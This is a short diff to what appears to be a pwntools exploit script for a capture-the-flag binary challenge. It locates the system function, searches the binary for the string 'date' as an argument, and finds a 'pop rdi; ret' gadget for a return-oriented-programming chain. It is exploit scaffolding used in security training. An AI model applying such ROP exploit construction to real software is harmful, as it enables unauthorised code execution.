@@ -19,9 +19,13 @@ info("%#x system", elf.symbols.system)
 #info("%s got", elf.got)
 #info("%s libs", elf.libs)
 
+execute_string = next(elf.search("date"))
+info("%#x system", execute_string)
+
 rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 info("%#x POP RDI", POP_RDI)
+
 
 log.info('Create IO')
 #io = remote('', )
